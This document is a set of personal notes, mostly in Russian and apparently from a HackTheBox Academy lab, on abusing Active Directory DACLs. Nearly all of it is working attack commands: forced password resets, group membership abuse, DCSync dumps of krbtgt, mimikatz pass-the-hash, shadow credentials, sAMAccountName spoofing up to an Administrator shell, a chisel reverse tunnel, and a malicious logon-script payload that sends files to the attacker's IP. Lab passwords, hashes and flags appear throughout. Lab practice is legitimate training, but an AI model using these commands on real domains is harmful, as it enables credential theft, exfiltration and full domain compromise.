# DACL

# DACL
Moly:Password2
pedro:SecuringAD01
xfreerdp /u:pedro /p:'SecuringAD01' /d:inlanefreight.local /v:10.129.205.81 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect


Используя dsacls, можно просмотреть права доступа, которыми Педро обладает к Йоланде. 

	dsacls.exe "cn=Yolanda,cn=users,dc=inlanefreight,dc=local" | Select-String "Pedro"

Использование PowerShell с DirectoryServices и ActiveDirectorySecurity 

PS C:\Users\Administrator> $directorySearcher = New-Object System.DirectoryServices.DirectorySearcher('(samaccountname=Yolanda)')

PS C:\Users\Administrator> $directorySearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Owner

PS C:\Users\Administrator> $binarySecurityDescriptor = $directorySearcher.FindOne().Properties.ntsecuritydescriptor[0]

PS C:\Users\Administrator> Write-Host -NoNewline $binarySecurityDescriptor

1 0 4 140 44 7 0 0 0 0 0 0 0 0 0 0 20 0 0 0 4 0 24 7 42 0 0 0 5 0 56 0 0 1 0 <SNIP>

Теперь, когда у нас есть security descriptor для YolandaПоскольку это бинарный файл, нам нужно разобрать его с помощью функции SetSecurityDescriptorBinaryForm из класса ActiveDirectorySecurity . Затем мы сможем просмотреть все данные. ACEs из Yolanda: 


PS C:\Users\Administrator> $parsedSecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity

PS C:\Users\Administrator> $parsedSecurityDescriptor.SetSecurityDescriptorBinaryForm($binarySecurityDescriptor)

PS C:\Users\Administrator> $parsedSecurityDescriptor.Access



Использование PowerShell для просмотра прав доступа Педро к Йоланде.

PS C:\Users\Administrator> $parsedSecurityDescriptor.Access | Where-Object {$_.IdentityReference -like '*Pedro*'}

Using PowerShell, enumerate the permission that Luna has over Sam and then submit the value of the member InheritanceFlags. (The answer is case-sensitive.)
(Get-Acl -Path "AD:\$((Get-ADUser Sam -Server DC01).DistinguishedName)").Access | Where-Object {$_.IdentityReference -like "*Luna*"}

Использование AccessChk

AccessChk — это часть пакета Sysinternals , позволяющая просматривать конкретные данные

PS C:\Users\Admin\Downloads\AccessChk> .\accesschk64.exe -p "explorer.exe" -l

# Перечисление списков контроля доступа (DACL) 

impacket-dacledit -target htb-student -dc-ip 10.129.205.81 inlanefreight.local/htb-student:'HTB_@cademy_stdnt!' 

bloodhound-python -d inlanefreight.local -ns 10.129.205.81 -u 'htb-student' -p 'HTB_@cademy_stdnt!'  -c all

# Целенаправленное использование Kerberoasting из Linux
 
mxdelta@htb[/htb]$ python3 targetedKerberoast.py -vv -d inlanefreight.local -u pedro -p SecuringAD01 --request-user rita --dc-ip 10.129.205.81

# AddMembers

Использование команды `net` для запроса членства в группе.

mxdelta@htb[/htb]$ net rpc group members 'TESTGROUP' -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

добавления Педро в список резервных операторов.

	net rpc group addmem 'Backup Operators' pedro -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

   bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" -u "e.rodriguez" -p 'WAT?watismypass!' add groupMember 'CHIEFS MARKETING' "e.rodriguez"
   
   bloodyAD --host 10.129.205.81 -d inlanefreight.local -u pedro -p SecuringAD01 add groupMember TESTGROUP  pedro


# Password Abuse

## Сброс пароля с помощью net 

MATCH p=((n:User {name:"PEDRO@INLANEFREIGHT.LOCAL"})-[r:ForceChangePassword|GenericAll|AllExtendedRights]->(m)) RETURN p		(поиск врзможных юзеров сс возможностью смены пароля)

net rpc password yolanda Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

Сброс пароля с помощью rpcclient

mxdelta@htb[/htb]$ rpcclient -U INLANEFREIGHT/pedro%SecuringAD01 10.129.205.81

rpcclient $> setuserinfo2 yolanda 23 Mynewpassword2

rpcclient $> exit


bloodyAD.py --host "dc01.inlanefreight.local" -d "inlanefreight.local" --kerberos --dc-ip 10.129.205.81 -u "pedro" -p "SecuringAD01' set password "yolanda"  Mynewpassword2

bloodyAD.py --host "dc01.inlanefreight.local" -d "inlanefreight.local" --kerberos --dc-ip 10.129.205.81 -u "yolanda"  -p 'Mynewpassword2' set password "Marcos"  Mynewpassword2

## ReadLAPSPassword 

MATCH p=((n)-[r:ReadLAPSPassword]->(m)) RETURN p		(поиск LAPS операторов)

Использование Active Directory для извлечения пароля LAPS.

 
PS C:\Tools> Import-Module ActiveDirectory

PS C:\Tools> Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name

nxc ldap 10.129.205.81 -u yolanda -p Mynewpassword2 -M laps 

## ReadGMSAPassword 

MATCH p=((n)-[r:ReadGMSAPassword]->(m)) RETURN p

python3 gMSADumper.py -d inlanefreight.local -l 10.129.205.81 -u pedro -p SecuringAD01

Использование Mimikatz для выполнения OverPass-the-Hash
 
C:\Tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe" exit

nxc ldap 10.129.205.81 -u Marcos -p Mynewpassword2 --gmsa

impacket-smbclient -hashes :758c049e342f9ee3e8f77d26126f7cb0 'inlanefreight.local/htb-svc$@10.129.205.81'

# Granting Rights and Ownership (Предоставление прав и собственности)

апрос к списку контроля доступа Luna через домен.

mxdelta@htb[/htb]$ python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123

Попытка синхронизации DCSync перед изменением DACL.
 
mxdelta@htb[/htb]$ secretsdump.py -just-dc-user krbtgt inlanefreight.local/luna:Moon123@10.129.205.81

Изменяйте списки контроля доступа (DACL) с помощью dacledit.py.

mxdelta@htb[/htb]$ impacket-dacledit -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 -action write -rights DCSync
impacket-secretsdump -just-dc-user krbtgt inlanefreight.local/luna:Moon123@10.129.205.81

## DCSync из Windows с помощью mimikatz

C:\Tools> mimikatz.exe "lsadump::dcsync /domain:inlanefreight.local /user:krbtgt /csv"

Использование чужих объектов с помощью WriteDacl — недопустимая ошибка.
Если мы встретим другие объекты, такие как группа или пользователь, мы сможем их назначить. FullControl злоупотреблять правами доступа к объекту и, соответственно, злоупотреблять ими. Возьмем в качестве примера следующее: Finance groupнад которым Luna имеет WriteDaclНам придётся использовать Lunaпривилегии назначать FullControl а потом addпользователь, входящий в группу, может злоупотреблять этой привилегией. 


Изменение параметров DACL в Luna для финансовой группы.

mxdelta@htb[/htb]$ python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 -action write

С помощью скрипта addusertogroup.py Луну добавляют в группу Finance.

        shellsession 
mxdelta@htb[/htb]$ python3 addusertogroup.py -d inlanefreight.local -g "Finance" -a luna -u luna -p Moon123

[+] Connected to Active Directory successfully.
[+] Group Finance found.
[+] User luna found.
[+] User added to group successfully.

Запрос списков контроля доступа Luna (DACL) в финансовой группе после внесения изменений.

        shellsession 
mxdelta@htb[/htb]$ python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123

Запрос списков контроля доступа Luna (DACL) в финансовой группе после возврата к исходному состоянию.

        shellsession 
mxdelta@htb[/htb]$ python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123

## Злоупотребление функцией WriteOwner в Linux. 

Загрузка и использование файла owneredit.py

        shellsession 
mxdelta@htb[/htb]$ wget -q https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py -O ./shutdownRepo/impacket/examples/owneredit.py

mxdelta@htb[/htb]$ python3 examples/owneredit.py -action write -new-owner pedro -target GPOAdmin -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

bloodyAD -H 10.129.205.122 -d inlanefreight.local -u mathew -p 'ilovejesus' \
  add groupMember 'Network Admins' mathew
  
Изменение прав пользователя с помощью dacledit.py

        shellsession 
mxdelta@htb[/htb]$ python3 examples/dacledit.py -principal pedro -target GPOAdmin -action write -rights FullControl -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

Сброс пароля GPOAdmin

        shellsession 
mxdelta@htb[/htb]$ net rpc password GPOAdmin Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

mxdelta@htb[/htb]$ poetry run crackmapexec ldap 10.129.205.81 -u GPOAdmin -p Mynewpassword1 

# Атака с использованием теневых учетных данных

## Атака на теневые учетные данные из Linux

python3 pywhisker.py -d lab.local -u jeffry -p Music001 --target gabriel --action add

python3 ~/tools/pywhisker/pywhisker/pywhisker.py -d lab.local -u jeffry -p Music001 --target gabriel --action add

* gettgtpkinit.pyявляется одним из инструментов, доступных в PKINITtoolsЭто поможет нам сгенерировать TGT

python3 gettgtpkinit.py -cert-pfx ../pywhisker/BX4EWk8m.pfx -pfx-pass KQAx5lHP3h9TtzNly2Us lab.local/gabriel gabriel.ccache

python3 ~/tools/PKINITtools/gettgtpkinit.py -cert-pfx SLxpH1qY.pfx -pfx-pass ujzCLrexGh4wvzlo3Eon lab.local/gabriel gabriel.ccache		(-key 2026-10-16 10:26:16,757 minikerberos INFO     6cfd6bb2b5df1ea4034f9f3ee7977e822dfcef9798ca274e5520881acee69968)

Если мы укажем правильные параметры, у нас будет файл с таким именем. gabriel.ccacheЭто представляет собой TGT, используемый в Linux

KRB5CCNAME=gabriel.ccache python3 getnthash.py -key 46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a lab.local/gabriel 

KRB5CCNAME=gabriel.ccache python3 ~/tools/PKINITtools/getnthash.py -key 6cfd6bb2b5df1ea4034f9f3ee7977e822dfcef9798ca274e5520881acee69968 lab.local/gabriel

KRB5CCNAME=gabriel.ccache smbclient.py -k -no-pass LAB-DC.LAB.LOCAL


1. Shadow Credentials на martha (через jeffry):


bloodyAD -H 10.129.228.236 -d lab.local -u jeffry -p 'Music001' \
  add shadowCredentials martha --path /home/max/DACL/martha
 → TGT: martha.ccache, NT: 4722cdef6e8b3e486e8888076bafe641

2. От имени martha — Shadow Credentials на PCTEST001$:


bloodyAD -H 10.129.228.236 -d lab.local -u martha -p ':4722cdef6e8b3e486e8888076bafe641' \
  add shadowCredentials 'PCTEST001$' --path /home/max/DACL/pctest
 → TGT: pctest.ccache, NT: 0d7310f228b5d3b4af53b2403641e767

3. Чтение флага по SMB (PtH от имени компьютера):


printf 'use PCSHARES\nget pcflag.txt\nexit\n' | \
  impacket-smbclient -hashes ':0d7310f228b5d3b4af53b2403641e767' 'lab.local/PCTEST001$@10.129.228.236'
→ pcflag.txt: HTB{THIS_1$_JUST_@_FL4G}

# Logon Scripts (Сценарии входа в систему)

Общий смысл (Logon Scripts abuse)

Логика раздела: если у тебя есть право писать в NETLOGON и/или менять scriptPath пользователя, ты подсовываешь свой скрипт, который выполнится в контексте жертвы при её следующем входе в домен.

Q1 (Wayne): у julio есть WriteProperty на scriptPath Wayne и RWX на папку NETLOGON\WaynesScripts. Значит можно положить свой .bat и переписать scriptPath на него.

Q2 (Benjamin): у julio на scriptPath Benjamin только ReadProperty (писать нельзя), НО scriptPath указывает на внешний «stub»-скрипт \\DC03\netlogon\CCEDF2EBD2F1\...\12E1CD03F3E1\12E1CD03F3E1.bat, а на эту папку у julio есть RWX → просто перезаписываем сам файл, scriptPath менять не нужно.
Оба пользователя в лабе логинятся периодически, поэтому скрипт срабатывает сам.

****Команды по шагам
1. Разведка прав julio:

bash
Copy
bloodyAD -H 10.129.229.224 -d inlanefreight.local -u julio -p 'SecurePassJul!08' get writable
 → wayne: WRITE, MOZHAR01$: WRITE

python3 /usr/local/bin/dacledit.py -principal julio -target wayne \
  -dc-ip 10.129.229.224 'inlanefreight.local/julio:SecurePassJul!08'
 → Script-Path: ReadProperty, WriteProperty

2. Права в NETLOGON:

bash
Copy
smbclient //10.129.229.224/NETLOGON -U 'julio%SecurePassJul!08' -c "ls"
smbcacls  //10.129.229.224/NETLOGON /WaynesScripts -U 'julio%SecurePassJul!08'
 → julio: ALLOWED RWX

3. scriptPath Benjamin (stub):

bloodyAD -H 10.129.229.224 -d inlanefreight.local -u julio -p 'SecurePassJul!08' \
  get object benjamin --attr scriptPath

→ \\DC03\netlogon\CCEDF2EBD2F1\DACEEFD3AFA1\32DCB1ACDBFE\12E1CD03F3E1\12E1CD03F3E1.bat

smbcacls //10.129.229.224/NETLOGON \
  "/CCEDF2EBD2F1/DACEEFD3AFA1/32DCB1ACDBFE/12E1CD03F3E1" -U 'julio%SecurePassJul!08'
 → julio: RWX

4. Payload (PowerShell-однострочник, читает флаг и шлёт на наш IP 10.10.14.2; кодируем в base64 UTF-16LE и кладём в .bat):


# wayne.bat / benjamin.bat
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <BASE64>
# внутри: TCPClient('10.10.14.2',9001) + Get-Content C:\Users\Wayne\Desktop\flag.txt

5. Q1 — залить payload и подменить scriptPath (относительный путь!):

smbclient //10.129.229.224/NETLOGON -U 'julio%SecurePassJul!08' \
  -c "cd WaynesScripts; put wayne.bat logonScript.bat"

bloodyAD -H 10.129.229.224 -d inlanefreight.local -u julio -p 'SecurePassJul!08' \
  set object wayne scriptPath -v 'WaynesScripts\logonScript.bat'

6. Q2 — перезаписать stub-скрипт Benjamin:


smbclient //10.129.229.224/NETLOGON -U 'julio%SecurePassJul!08' \
  -c "cd CCEDF2EBD2F1; cd DACEEFD3AFA1; cd 32DCB1ACDBFE; cd 12E1CD03F3E1; put benjamin.bat 12E1CD03F3E1.bat"

7. Слушатели и ожидание логинов:


python3 listen.py 9001 wayne_flag.txt      # приёмник для Wayne
python3 listen.py 9002 benjamin_flag.txt   # приёмник для Benjamin

 через пару минут:

cat wayne_flag.txt     # WAYNE|HTB{eb047f7fd26005d6444ec1b8e4f10de1}

cat benjamin_flag.txt  # BENJAMIN|HTB{0890f49418cd8bc45c727a99360003d6}

Ключевой вывод раздела: scriptPath + права на файл/папку в NETLOGON = выполнение кода при следующем логине жертвы; для Benjamin достаточно было прав на сам stub-файл, даже без записи в scriptPath.


# SPN Jacking 

SPN Jacking — это альтернативный способ злоупотребления. WriteSPNправа
разрушительно

# Злоупотребление подменой sAMAccountName из Linux (NoPAC для пользоватееля)
"aneudy" имеет GenericAll GenericWrite WriteDacl WriteOwner / Owns права на "felipe". - нужны пароли обоих 

MATCH p=(a:User)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(b:User)
RETURN p

1. Записать SPN felipe (если нет то хорошо)

bloodyAD -d inlanefreight.local -u aneudy -p Ilovemusic01 --host 10.129.4.72 get object felipe | grep "servicePrincipalName\|sAMAccountName" 

	sAMAccountName: felipe
	servicePrincipalName: HTTP/srv03

echo 'HTTP/srv03' > felipe_spns.txt

cat felipe_spns.txt

Или сразу из AD в файл:

ldapsearch -LLL -o ldif-wrap=no -H "ldap://10.129.4.72" -x \
  -D 'aneudy@inlanefreight.local' -w 'Ilovemusic01' \
  -b 'DC=inlanefreight,DC=local' '(sAMAccountName=felipe)' servicePrincipalName \
  | sed -n 's/^servicePrincipalName: //p' | tee felipe_spns.txt
  
2. Очистить SPN

bloodyAD -d inlanefreight.local -u aneudy -p 'Ilovemusic01' --host 10.129.4.72 set object felipe servicePrincipalName
  
3. Атака

bloodyAD -d inlanefreight.local -u aneudy -p 'Ilovemusic01' --host 10.129.4.72 set object felipe sAMAccountName -v DC03
  
getTGT.py inlanefreight.local/dc03:Hacker0039 -dc-ip 10.129.4.72

Следующий шаг — вернуть значение sAMAccountName Фелипе к исходному значению

bloodyAD -d inlanefreight.local -u aneudy -p 'Ilovemusic01' --host 10.129.4.72 set object DC03 sAMAccountName -v felipe
  
KRB5CCNAME=dc03.ccache getST.py inlanefreight.local/dc03 -self -impersonate 'Administrator' -altservice 'cifs/dc03.inlanefreight.local' -k -no-pass -dc-ip 10.129.4.72

KRB5CCNAME='Administrator@cifs_dc03.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache' psexec.py dc03.inlanefreight.local -k -no-pass

4. Восстановить SPN

bloodyAD -d inlanefreight.local -u aneudy -p 'Ilovemusic01' --host 10.129.4.72 set object felipe servicePrincipalName -v 'HTTP/srv03'
  
5. Проверить

bloodyAD -d inlanefreight.local -u aneudy -p 'Ilovemusic01' --host 10.129.4.72 get object felipe | grep "servicePrincipalName\|sAMAccountName"
  
# Атаки на групповые политики (GPO)

https://github.com/X-C3LL/GPOwned
сложно

~/tools/chisel server --reverse --socks5 -p 8001
.\chisel.exe client 10.10.14.2:8001 R:socks 
